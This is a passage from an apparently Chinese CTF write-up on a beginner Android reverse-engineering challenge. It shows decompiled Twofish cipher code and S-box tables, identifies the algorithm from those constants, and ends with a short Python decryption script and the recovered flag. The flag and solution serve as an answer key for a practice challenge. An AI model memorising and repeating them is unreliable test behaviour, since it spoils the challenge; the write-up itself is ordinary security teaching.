v1[<span class="number">2</span>];</span><br><span class="line">    v4 = v8 ^ v1[<span class="number">3</span>];</span><br><span class="line">    v3 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">for</span>(v2 = <span class="number">0</span>; v2 &lt; <span class="number">16</span>; v2 += <span class="number">2</span>) &#123;</span><br><span class="line">        v8 = b.a(v0, v7, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> v9 = b.a(v0, v6, <span class="number">3</span>);</span><br><span class="line">        <span class="keyword">int</span> v11 = v3 + <span class="number">1</span>;</span><br><span class="line">        v3 = v1[v3] + (v8 + v9) ^ v5;</span><br><span class="line">        v5 = v3 &gt;&gt;&gt; <span class="number">1</span> | v3 &lt;&lt; <span class="number">0x1F</span>;</span><br><span class="line">        v3 = v4 &lt;&lt; <span class="number">1</span> | v4 &gt;&gt;&gt; <span class="number">0x1F</span>;</span><br><span class="line">        v4 = v9 * <span class="number">2</span> + v8;</span><br><span class="line">        v8 = v11 + <span class="number">1</span>;</span><br><span class="line">        v4 = v4 + v1[v11] ^ v3;</span><br><span class="line">        v3 = b.a(v0, v5, <span class="number">0</span>);</span><br><span class="line">        v9 = b.a(v0, v4, <span class="number">3</span>);</span><br><span class="line">        v11 = v8 + <span class="number">1</span>;</span><br><span class="line">        v7 ^= v1[v8] + (v3 + v9);</span><br><span class="line">        v7 = v7 &lt;&lt; <span class="number">0x1F</span> | v7 &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        v8 = v9 * <span class="number">2</span> + v3;</span><br><span class="line">        v3 = v11 + <span class="number">1</span>;</span><br><span class="line">        v6 = (v6 &gt;&gt;&gt; <span class="number">0x1F</span> | v6 &lt;&lt; <span class="number">1</span>) ^ v8 + v1[v11];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v0_1 = v1[<span class="number">4</span>] ^ v5;</span><br><span class="line">    v2 = v1[<span class="number">5</span>] ^ v4;</span><br><span class="line">    v3 = v1[<span class="number">6</span>] ^ v7;</span><br><span class="line">    <span class="keyword">int</span> v1_1 = v1[<span class="number">7</span>] ^ v6;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;((<span class="keyword">byte</span>)v0_1), ((<span class="keyword">byte</span>)(v0_1 &gt;&gt;&gt; <span class="number">8</span>)), ((<span class="keyword">byte</span>)(v0_1 &gt;&gt;&gt; <span class="number">16</span>)), ((<span class="keyword">byte</span>)(v0_1 &gt;&gt;&gt; <span class="number">24</span>)), ((<span class="keyword">byte</span>)v2), ((<span class="keyword">byte</span>)(v2 &gt;&gt;&gt; <span class="number">8</span>)), ((<span class="keyword">byte</span>)(v2 &gt;&gt;&gt; <span class="number">16</span>)), ((<span class="keyword">byte</span>)(v2 &gt;&gt;&gt; <span class="number">24</span>)), ((<span class="keyword">byte</span>)v3), ((<span class="keyword">byte</span>)(v3 &gt;&gt;&gt; <span class="number">8</span>)), ((<span class="keyword">byte</span>)(v3 &gt;&gt;&gt; <span class="number">16</span>)), ((<span class="keyword">byte</span>)(v3 &gt;&gt;&gt; <span class="number">24</span>)), ((<span class="keyword">byte</span>)v1_1), ((<span class="keyword">byte</span>)(v1_1 &gt;&gt;&gt; <span class="number">8</span>)), ((<span class="keyword">byte</span>)(v1_1 &gt;&gt;&gt; <span class="number">16</span>)), ((<span class="keyword">byte</span>)(v1_1 &gt;&gt;&gt; <span class="number">24</span>))&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分组密码可以去找一下特征，看到了 b 类的头上定义了两个数据，转成 16 进制之后拿去搜一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v0[<span class="number">0</span>] = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;-<span class="number">87</span>, <span class="number">103</span>, -<span class="number">77</span>, -<span class="number">24</span>, <span class="number">4</span>, -<span class="number">3</span>, -<span class="number">93</span>, <span class="number">0x76</span>, -<span class="number">102</span>, -<span class="number">110</span>, -<span class="number">128</span>, <span class="number">120</span>, -<span class="number">28</span>, -<span class="number">35</span>, -<span class="number">47</span>, <span class="number">56</span>, <span class="number">13</span>, -<span class="number">58</span>, <span class="number">53</span>, -<span class="number">104</span>, <span class="number">24</span>, -<span class="number">9</span>, -<span class="number">20</span>, <span class="number">108</span>, <span class="number">67</span>, <span class="number">0x75</span>, <span class="number">55</span>, <span class="number">38</span>, -<span class="number">6</span>, <span class="number">19</span>, -<span class="number">108</span>, <span class="number">72</span>, -<span class="number">14</span>, -<span class="number">48</span>, -<span class="number">117</span>, <span class="number">0x30</span>, -<span class="number">124</span>, <span class="number">84</span>, -<span class="number">33</span>, <span class="number">35</span>, <span class="number">25</span>, <span class="number">91</span>, <span class="number">61</span>, <span class="number">89</span>, -<span class="number">13</span>, -<span class="number">82</span>, -<span class="number">94</span>, -<span class="number">126</span>, <span class="number">99</span>, <span class="number">1</span>, -<span class="number">125</span>, <span class="number">46</span>, -<span class="number">39</span>, <span class="number">81</span>, -<span class="number">101</span>, <span class="number">0x7C</span>, -<span class="number">90</span>, -<span class="number">21</span>, -<span class="number">91</span>, -<span class="number">66</span>, <span class="number">22</span>, <span class="number">12</span>, -<span class="number">29</span>, <span class="number">97</span>, -<span class="number">64</span>, -<span class="number">116</span>, <span class="number">58</span>, -<span class="number">11</span>, <span class="number">0x73</span>, <span class="number">44</span>, <span class="number">37</span>, <span class="number">11</span>, -<span class="number">69</span>, <span class="number">78</span>, -<span class="number">119</span>, <span class="number">107</span>, <span class="number">83</span>, <span class="number">106</span>, -<span class="number">76</span>, -<span class="number">15</span>, -<span class="number">31</span>, -<span class="number">26</span>, -<span class="number">67</span>, <span class="number">69</span>, -<span class="number">30</span>, -<span class="number">12</span>, -<span class="number">74</span>, <span class="number">102</span>, -<span class="number">52</span>, -<span class="number">107</span>, <span class="number">3</span>, <span class="number">86</span>, -<span class="number">44</span>, <span class="number">28</span>, <span class="number">30</span>, -<span class="number">41</span>, -<span class="number">5</span>, -<span class="number">61</span>, -<span class="number">114</span>, -<span class="number">75</span>, -<span class="number">23</span>, -<span class="number">49</span>, -<span class="number">65</span>, -<span class="number">70</span>, -<span class="number">22</span>, <span class="number">0x77</span>, <span class="number">57</span>, -<span class="number">81</span>, <span class="number">51</span>, -<span class="number">55</span>, <span class="number">98</span>, <span class="number">0x71</span>, -<span class="number">127</span>, <span class="number">0x79</span>, <span class="number">9</span>, -<span class="number">83</span>, <span class="number">36</span>, -<span class="number">51</span>, -<span class="number">7</span>, -<span class="number">40</span>, -<span class="number">27</span>, -<span class="number">59</span>, -<span class="number">71</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">8</span>, -<span class="number">122</span>, -<span class="number">25</span>, -<span class="number">95</span>, <span class="number">29</span>, -<span class="number">86</span>, -<span class="number">19</span>, <span class="number">6</span>, <span class="number">0x70</span>, -<span class="number">78</span>, -<span class="number">46</span>, <span class="number">65</span>, <span class="number">0x7B</span>, -<span class="number">96</span>, <span class="number">17</span>, <span class="number">49</span>, -<span class="number">62</span>, <span class="number">39</span>, -<span class="number">112</span>, <span class="number">0x20</span>, -<span class="number">10</span>, <span class="number">0x60</span>, -<span class="number">1</span>, -<span class="number">106</span>, <span class="number">92</span>, -<span class="number">79</span>, -<span class="number">85</span>, -<span class="number">98</span>, -<span class="number">100</span>, <span class="number">82</span>, <span class="number">27</span>, <span class="number">0x5F</span>, -<span class="number">109</span>, <span class="number">10</span>, -<span class="number">17</span>, -<span class="number">111</span>, -<span class="number">123</span>, <span class="number">73</span>, -<span class="number">18</span>, <span class="number">45</span>, <span class="number">0x4F</span>, -<span class="number">113</span>, <span class="number">59</span>, <span class="number">71</span>, -<span class="number">121</span>, <span class="number">109</span>, <span class="number">70</span>, -<span class="number">42</span>, <span class="number">62</span>, <span class="number">105</span>, <span class="number">100</span>, <span class="number">42</span>, -<span class="number">50</span>, -<span class="number">53</span>, <span class="number">0x2F</span>, -<span class="number">4</span>, -<span class="number">105</span>, <span class="number">5</span>, <span class="number">0x7A</span>, -<span class="number">84</span>, <span class="number">0x7F</span>, -<span class="number">43</span>, <span class="number">26</span>, <span class="number">75</span>, <span class="number">14</span>, -<span class="number">89</span>, <span class="number">90</span>, <span class="number">40</span>, <span class="number">20</span>, <span class="number">0x3F</span>, <span class="number">41</span>, -<span class="number">120</span>, <span class="number">60</span>, <span class="number">76</span>, <span class="number">2</span>, -<span class="number">72</span>, -<span class="number">38</span>, -<span class="number">80</span>, <span class="number">23</span>, <span class="number">85</span>, <span class="number">0x1F</span>, -<span class="number">118</span>, <span class="number">0x7D</span>, <span class="number">87</span>, -<span class="number">57</span>, -<span class="number">115</span>, <span class="number">0x74</span>, -<span class="number">73</span>, -<span class="number">60</span>, -<span class="number">97</span>, <span class="number">0x72</span>, <span class="number">0x7E</span>, <span class="number">21</span>, <span class="number">34</span>, <span class="number">18</span>, <span class="number">88</span>, <span class="number">7</span>, -<span class="number">103</span>, <span class="number">52</span>, <span class="number">110</span>, <span class="number">80</span>, -<span class="number">34</span>, <span class="number">104</span>, <span class="number">101</span>, -<span class="number">68</span>, -<span class="number">37</span>, -<span class="number">8</span>, -<span class="number">56</span>, -<span class="number">88</span>, <span class="number">43</span>, <span class="number">0x40</span>, -<span class="number">36</span>, -<span class="number">2</span>, <span class="number">50</span>, -<span class="number">92</span>, -<span class="number">54</span>, <span class="number">16</span>, <span class="number">33</span>, -<span class="number">16</span>, -<span class="number">45</span>, <span class="number">93</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">0x6F</span>, -<span class="number">99</span>, <span class="number">54</span>, <span class="number">66</span>, <span class="number">74</span>, <span class="number">94</span>, -<span class="number">63</span>, -<span class="number">32</span>&#125;; <span class="comment">// 0xA9, 0x67, 0xB3, 0xE8, 0x04, 0xFD, 0xA3, 0x76, 0x9A, 0x92, 0x80, 0x78, 0xE4, 0xDD, 0xD1, 0x38, 0x0D, 0xC6, 0x35, 0x98, 0x18, 0xF7, 0xEC, 0x6C, 0x43, 0x75, 0x37, 0x26, 0xFA, 0x13, 0x94, 0x48, 0xF2, 0xD0, 0x8B, 0x30, 0x84, 0x54, 0xDF, 0x23, 0x19, 0x5B, 0x3D, 0x59, 0xF3, 0xAE, 0xA2, 0x82, 0x63, 0x01, 0x83, 0x2E, 0xD9, 0x51, 0x9B, 0x7C, 0xA6, 0xEB, 0xA5, 0xBE, 0x16, 0x0C, 0xE3, 0x61, 0xC0, 0x8C, 0x3A, 0xF5, 0x73, 0x2C, 0x25, 0x0B, 0xBB, 0x4E, 0x89, 0x6B, 0x53, 0x6A, 0xB4, 0xF1, 0xE1, 0xE6, 0xBD, 0x45, 0xE2, 0xF4, 0xB6, 0x66, 0xCC, 0x95, 0x03, 0x56, 0xD4, 0x1C, 0x1E, 0xD7, 0xFB, 0xC3, 0x8E, 0xB5, 0xE9, 0xCF, 0xBF, 0xBA, 0xEA, 0x77, 0x39, 0xAF, 0x33, 0xC9, 0x62, 0x71, 0x81, 0x79, 0x09, 0xAD, 0x24, 0xCD, 0xF9, 0xD8, 0xE5, 0xC5, 0xB9, 0x4D, 0x44, 0x08, 0x86, 0xE7, 0xA1, 0x1D, 0xAA, 0xED, 0x06, 0x70, 0xB2, 0xD2, 0x41, 0x7B, 0xA0, 0x11, 0x31, 0xC2, 0x27, 0x90, 0x20, 0xF6, 0x60, 0xFF, 0x96, 0x5C, 0xB1, 0xAB, 0x9E, 0x9C, 0x52, 0x1B, 0x5F, 0x93, 0x0A, 0xEF, 0x91, 0x85, 0x49, 0xEE, 0x2D, 0x4F, 0x8F, 0x3B, 0x47, 0x87, 0x6D, 0x46, 0xD6, 0x3E, 0x69, 0x64, 0x2A, 0xCE, 0xCB, 0x2F, 0xFC, 0x97, 0x05, 0x7A, 0xAC, 0x7F, 0xD5, 0x1A, 0x4B, 0x0E, 0xA7, 0x5A, 0x28, 0x14, 0x3F, 0x29, 0x88, 0x3C, 0x4C, 0x02, 0xB8, 0xDA, 0xB0, 0x17, 0x55, 0x1F, 0x8A, 0x7D, 0x57, 0xC7, 0x8D, 0x74, 0xB7, 0xC4, 0x9F, 0x72, 0x7E, 0x15, 0x22, 0x12, 0x58, 0x07, 0x99, 0x34, 0x6E, 0x50, 0xDE, 0x68, 0x65, 0xBC, 0xDB, 0xF8, 0xC8, 0xA8, 0x2B, 0x40, 0xDC, 0xFE, 0x32, 0xA4, 0xCA, 0x10, 0x21, 0xF0, 0xD3, 0x5D, 0x0F, 0x00, 0x6F, 0x9D, 0x36, 0x42, 0x4A, 0x5E, 0xC1, 0xE0</span></span><br><span class="line">v0[<span class="number">1</span>] = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">0x75</span>, -<span class="number">13</span>, -<span class="number">58</span>, -<span class="number">12</span>, -<span class="number">37</span>, <span class="number">0x7B</span>, -<span class="number">5</span>, -<span class="number">56</span>, <span class="number">74</span>, -<span class="number">45</span>, -<span class="number">26</span>, <span class="number">107</span>, <span class="number">69</span>, <span class="number">0x7D</span>, -<span class="number">24</span>, <span class="number">75</span>, -<span class="number">42</span>, <span class="number">50</span>, -<span class="number">40</span>, -<span class="number">3</span>, <span class="number">55</span>, <span class="number">0x71</span>, -<span class="number">15</span>, -<span class="number">31</span>, <span class="number">0x30</span>, <span class="number">15</span>, -<span class="number">8</span>, <span class="number">27</span>, -<span class="number">121</span>, -<span class="number">6</span>, <span class="number">6</span>, <span class="number">0x3F</span>, <span class="number">94</span>, -<span class="number">70</span>, -<span class="number">82</span>, <span class="number">91</span>, -<span class="number">118</span>, <span class="number">0</span>, -<span class="number">68</span>, -<span class="number">99</span>, <span class="number">109</span>, -<span class="number">63</span>, -<span class="number">79</span>, <span class="number">14</span>, -<span class="number">128</span>, <span class="number">93</span>, -<span class="number">46</span>, -<span class="number">43</span>, -<span class="number">96</span>, -<span class="number">124</span>, <span class="number">7</span>, <span class="number">20</span>, -<span class="number">75</span>, -<span class="number">112</span>, <span class="number">44</span>, -<span class="number">93</span>, -<span class="number">78</span>, <span class="number">0x73</span>, <span class="number">76</span>, <span class="number">84</span>, -<span class="number">110</span>, <span class="number">0x74</span>, <span class="number">54</span>, <span class="number">81</span>, <span class="number">56</span>, -<span class="number">80</span>, -<span class="number">67</span>, <span class="number">90</span>, -<span class="number">4</span>, <span class="number">0x60</span>, <span class="number">98</span>, -<span class="number">106</span>, <span class="number">108</span>, <span class="number">66</span>, -<span class="number">9</span>, <span class="number">16</span>, <span class="number">0x7C</span>, <span class="number">40</span>, <span class="number">39</span>, -<span class="number">116</span>, <span class="number">19</span>, -<span class="number">107</span>, -<span class="number">100</span>, -<span class="number">57</span>, <span class="number">36</span>, <span class="number">70</span>, <span class="number">59</span>, <span class="number">0x70</span>, -<span class="number">54</span>, -<span class="number">29</span>, -<span class="number">123</span>, -<span class="number">53</span>, <span class="number">17</span>, -<span class="number">48</span>, -<span class="number">109</span>, -<span class="number">72</span>, -<span class="number">90</span>, -<span class="number">125</span>, <span class="number">0x20</span>, -<span class="number">1</span>, -<span class="number">97</span>, <span class="number">0x77</span>, -<span class="number">61</span>, -<span class="number">52</span>, <span class="number">3</span>, <span class="number">0x6F</span>, <span class="number">8</span>, -<span class="number">65</span>, <span class="number">0x40</span>, -<span class="number">25</span>, <span class="number">43</span>, -<span class="number">30</span>, <span class="number">0x79</span>, <span class="number">12</span>, -<span class="number">86</span>, -<span class="number">126</span>, <span class="number">65</span>, <span class="number">58</span>, -<span class="number">22</span>, -<span class="number">71</span>, -<span class="number">28</span>, -<span class="number">102</span>, -<span class="number">92</span>, -<span class="number">105</span>, <span class="number">0x7E</span>, -<span class="number">38</span>, <span class="number">0x7A</span>, <span class="number">23</span>, <span class="number">102</span>, -<span class="number">108</span>, -<span class="number">95</span>, <span class="number">29</span>, <span class="number">61</span>, -<span class="number">16</span>, -<span class="number">34</span>, -<span class="number">77</span>, <span class="number">11</span>, <span class="number">0x72</span>, -<span class="number">89</span>, <span class="number">28</span>, -<span class="number">17</span>, -<span class="number">47</span>, <span class="number">83</span>, <span class="number">62</span>, -<span class="number">113</span>, <span class="number">51</span>, <span class="number">38</span>, <span class="number">0x5F</span>, -<span class="number">20</span>, <span class="number">0x76</span>, <span class="number">42</span>, <span class="number">73</span>, -<span class="number">127</span>, -<span class="number">120</span>, -<span class="number">18</span>, <span class="number">33</span>, -<span class="number">60</span>, <span class="number">26</span>, -<span class="number">21</span>, -<span class="number">39</span>, -<span class="number">59</span>, <span class="number">57</span>, -<span class="number">103</span>, -<span class="number">51</span>, -<span class="number">83</span>, <span class="number">49</span>, -<span class="number">117</span>, <span class="number">1</span>, <span class="number">24</span>, <span class="number">35</span>, -<span class="number">35</span>, <span class="number">0x1F</span>, <span class="number">78</span>, <span class="number">45</span>, -<span class="number">7</span>, <span class="number">72</span>, <span class="number">0x4F</span>, -<span class="number">14</span>, <span class="number">101</span>, -<span class="number">114</span>, <span class="number">120</span>, <span class="number">92</span>, <span class="number">88</span>, <span class="number">25</span>, -<span class="number">115</span>, -<span class="number">27</span>, -<span class="number">104</span>, <span class="number">87</span>, <span class="number">103</span>, <span class="number">0x7F</span>, <span class="number">5</span>, <span class="number">100</span>, -<span class="number">81</span>, <span class="number">99</span>, -<span class="number">74</span>, -<span class="number">2</span>, -<span class="number">11</span>, -<span class="number">73</span>, <span class="number">60</span>, -<span class="number">91</span>, -<span class="number">50</span>, -<span class="number">23</span>, <span class="number">104</span>, <span class="number">68</span>, -<span class="number">32</span>, <span class="number">77</span>, <span class="number">67</span>, <span class="number">105</span>, <span class="number">41</span>, <span class="number">46</span>, -<span class="number">84</span>, <span class="number">21</span>, <span class="number">89</span>, -<span class="number">88</span>, <span class="number">10</span>, -<span class="number">98</span>, <span class="number">110</span>, <span class="number">71</span>, -<span class="number">33</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">106</span>, -<span class="number">49</span>, -<span class="number">36</span>, <span class="number">34</span>, -<span class="number">55</span>, -<span class="number">64</span>, -<span class="number">101</span>, -<span class="number">119</span>, -<span class="number">44</span>, -<span class="number">19</span>, -<span class="number">85</span>, <span class="number">18</span>, -<span class="number">94</span>, <span class="number">13</span>, <span class="number">82</span>, -<span class="number">69</span>, <span class="number">2</span>, <span class="number">0x2F</span>, -<span class="number">87</span>, -<span class="number">41</span>, <span class="number">97</span>, <span class="number">30</span>, -<span class="number">76</span>, <span class="number">80</span>, <span class="number">4</span>, -<span class="number">10</span>, -<span class="number">62</span>, <span class="number">22</span>, <span class="number">37</span>, -<span class="number">122</span>, <span class="number">86</span>, <span class="number">85</span>, <span class="number">9</span>, -<span class="number">66</span>, -<span class="number">111</span>&#125;; <span class="comment">// 0x75, 0xF3, 0xC6, 0xF4, 0xDB, 0x7B, 0xFB, 0xC8, 0x4A, 0xD3, 0xE6, 0x6B, 0x45, 0x7D, 0xE8, 0x4B, 0xD6, 0x32, 0xD8, 0xFD, 0x37, 0x71, 0xF1, 0xE1, 0x30, 0x0F, 0xF8, 0x1B, 0x87, 0xFA, 0x06, 0x3F, 0x5E, 0xBA, 0xAE, 0x5B, 0x8A, 0x00, 0xBC, 0x9D, 0x6D, 0xC1, 0xB1, 0x0E, 0x80, 0x5D, 0xD2, 0xD5, 0xA0, 0x84, 0x07, 0x14, 0xB5, 0x90, 0x2C, 0xA3, 0xB2, 0x73, 0x4C, 0x54, 0x92, 0x74, 0x36, 0x51, 0x38, 0xB0, 0xBD, 0x5A, 0xFC, 0x60, 0x62, 0x96, 0x6C, 0x42, 0xF7, 0x10, 0x7C, 0x28, 0x27, 0x8C, 0x13, 0x95, 0x9C, 0xC7, 0x24, 0x46, 0x3B, 0x70, 0xCA, 0xE3, 0x85, 0xCB, 0x11, 0xD0, 0x93, 0xB8, 0xA6, 0x83, 0x20, 0xFF, 0x9F, 0x77, 0xC3, 0xCC, 0x03, 0x6F, 0x08, 0xBF, 0x40, 0xE7, 0x2B, 0xE2, 0x79, 0x0C, 0xAA, 0x82, 0x41, 0x3A, 0xEA, 0xB9, 0xE4, 0x9A, 0xA4, 0x97, 0x7E, 0xDA, 0x7A, 0x17, 0x66, 0x94, 0xA1, 0x1D, 0x3D, 0xF0, 0xDE, 0xB3, 0x0B, 0x72, 0xA7, 0x1C, 0xEF, 0xD1, 0x53, 0x3E, 0x8F, 0x33, 0x26, 0x5F, 0xEC, 0x76, 0x2A, 0x49, 0x81, 0x88, 0xEE, 0x21, 0xC4, 0x1A, 0xEB, 0xD9, 0xC5, 0x39, 0x99, 0xCD, 0xAD, 0x31, 0x8B, 0x01, 0x18, 0x23, 0xDD, 0x1F, 0x4E, 0x2D, 0xF9, 0x48, 0x4F, 0xF2, 0x65, 0x8E, 0x78, 0x5C, 0x58, 0x19, 0x8D, 0xE5, 0x98, 0x57, 0x67, 0x7F, 0x05, 0x64, 0xAF, 0x63, 0xB6, 0xFE, 0xF5, 0xB7, 0x3C, 0xA5, 0xCE, 0xE9, 0x68, 0x44, 0xE0, 0x4D, 0x43, 0x69, 0x29, 0x2E, 0xAC, 0x15, 0x59, 0xA8, 0x0A, 0x9E, 0x6E, 0x47, 0xDF, 0x34, 0x35, 0x6A, 0xCF, 0xDC, 0x22, 0xC9, 0xC0, 0x9B, 0x89, 0xD4, 0xED, 0xAB, 0x12, 0xA2, 0x0D, 0x52, 0xBB, 0x02, 0x2F, 0xA9, 0xD7, 0x61, 0x1E, 0xB4, 0x50, 0x04, 0xF6, 0xC2, 0x16, 0x25, 0x86, 0x56, 0x55, 0x09, 0xBE, 0x91</span></span><br></pre></td></tr></table></figure><p>发现是 twofish 算法：</p><p><img src="/pics/攻防世界-MOBILE-新手练习区/2.png" alt="搜索结果"></p><p>上面的一些资源可以在 Resources/values/public.xml 中找到 ID 对应的字符串名：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="tag">&lt;<span class="name">public</span> <span class="attr">id</span>=<span class="string">"0x7f04001a"</span> <span class="attr">name</span>=<span class="string">"activity_main"</span> <span class="attr">type</span>=<span class="string">"layout"</span> /&gt;</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="tag">&lt;<span class="name">public</span> <span class="attr">id</span>=<span class="string">"0x7f060022"</span> <span class="attr">name</span>=<span class="string">"no"</span> <span class="attr">type</span>=<span class="string">"string"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">public</span> <span class="attr">id</span>=<span class="string">"0x7f060023"</span> <span class="attr">name</span>=<span class="string">"two_fish"</span> <span class="attr">type</span>=<span class="string">"string"</span> /&gt;</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="tag">&lt;<span class="name">public</span> <span class="attr">id</span>=<span class="string">"0x7f060025"</span> <span class="attr">name</span>=<span class="string">"yes"</span> <span class="attr">type</span>=<span class="string">"string"</span> /&gt;</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="tag">&lt;<span class="name">public</span> <span class="attr">id</span>=<span class="string">"0x7f0b0054"</span> <span class="attr">name</span>=<span class="string">"edit_text"</span> <span class="attr">type</span>=<span class="string">"id"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">public</span> <span class="attr">id</span>=<span class="string">"0x7f0b0055"</span> <span class="attr">name</span>=<span class="string">"button"</span> <span class="attr">type</span>=<span class="string">"id"</span> /&gt;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以在 Resources/values/strings.xml 中找到对应的字符串：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"no"</span>&gt;</span></span><br><span class="line">    NO~ You don't get me~ T_T<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"two_fish"</span>&gt;</span></span><br><span class="line">    I have a male fish and a female fish.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"what_else"</span>&gt;</span></span><br><span class="line">    What else?<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"yes"</span>&gt;</span></span><br><span class="line">    Yes! You got me! :)<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后找个库实现一下解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> twofish <span class="keyword">import</span> Twofish</span><br><span class="line"></span><br><span class="line">ciphertext = [<span class="number">0x88</span>, <span class="number">0x4D</span>, <span class="number">0xF2</span>, <span class="number">0xDA</span>, <span class="number">0x11</span>, <span class="number">0x05</span>, <span class="number">0xD6</span>, <span class="number">0x2C</span>, <span class="number">0xE0</span>, <span class="number">0x6D</span>, <span class="number">0x55</span>, <span class="number">0x1F</span>, <span class="number">0x18</span>, <span class="number">0xA5</span>, <span class="number">0x90</span>, <span class="number">0xAD</span>, <span class="number">0x40</span>, <span class="number">0xAD</span>, <span class="number">0x80</span>, <span class="number">0x54</span>, <span class="number">0x05</span>, <span class="number">0xA2</span>, <span class="number">0x9E</span>, <span class="number">0xE2</span>, <span class="number">0x12</span>, <span class="number">0x46</span>, <span class="number">0xE6</span>, <span class="number">0x47</span>, <span class="number">0x05</span>, <span class="number">0x9D</span>, <span class="number">0xC2</span>, <span class="number">0xC6</span>, <span class="number">0x75</span>, <span class="number">0x1D</span>, <span class="number">0xD4</span>, <span class="number">0x06</span>, <span class="number">0x70</span>, <span class="number">0xFC</span>, <span class="number">0x51</span>, <span class="number">0x54</span>, <span class="number">0x09</span>, <span class="number">0x16</span>, <span class="number">0xCD</span>, <span class="number">0x5F</span>, <span class="number">0xDE</span>, <span class="number">0x0C</span>, <span class="number">0x2F</span>, <span class="number">0x4D</span>]</span><br><span class="line">ciphertext = <span class="string">''</span>.join([chr(c) <span class="keyword">for</span> c <span class="keyword">in</span> ciphertext])</span><br><span class="line"></span><br><span class="line">T = Twofish(<span class="string">'I have a male fish and a female '</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">48</span>, <span class="number">16</span>):</span><br><span class="line">    flag += T.decrypt(ciphertext[i:i+<span class="number">16</span>])</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="comment"># qwb&#123;TH3y_Io&lt;e_EACh_OTh3r_FOrEUER&#125;</span></span><br></pre></td></tr></table></figure><h1 id="你是谁"><a href="#你是谁" class="headerlink" title="你是谁"></a>你是谁</h1><p>TODO:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span> <span class="attr">android:versionCode</span>=<span class="string">"1"</span> <span class="attr">android:versionName</span>=<span class="string">"1.0"</span> <span 